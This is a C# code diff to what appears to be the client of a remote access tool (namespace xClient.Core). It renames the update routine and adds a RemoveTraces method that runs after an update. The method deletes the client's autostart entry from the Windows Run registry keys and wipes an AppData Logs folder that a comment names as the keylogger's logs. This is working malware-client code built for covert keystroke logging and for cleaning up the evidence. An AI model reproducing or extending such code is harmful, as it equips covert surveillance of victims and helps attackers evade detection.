@@ -522,7 +522,7 @@ namespace xClient.Core
             Disconnect = true;
         }
 
-        public static void Update(Client c, string newFile)
+        public static void UpdateClient(Client c, string newFile)
         {
             try
             {
@@ -565,11 +565,83 @@ namespace xClient.Core
 
                 Disconnect = true;
                 c.Disconnect();
+                RemoveTraces();
             }
             catch (Exception ex)
             {
                 DeleteFile(newFile);
                 new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(c);
+            }
+        }
+
+        public static void RemoveTraces()
+        {
+            if (Settings.STARTUP)
+            {
+                if (AccountType == "Admin")
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        // try deleting from Registry.CurrentUser
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
+
+            string logsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
+            if (Directory.Exists(logsDirectory)) // try to delete Logs from Keylogger
+            {
+                try
+                {
+                    Directory.Delete(logsDirectory, true);
+                }
+                catch
+                {
+                }
             }
         }
     }
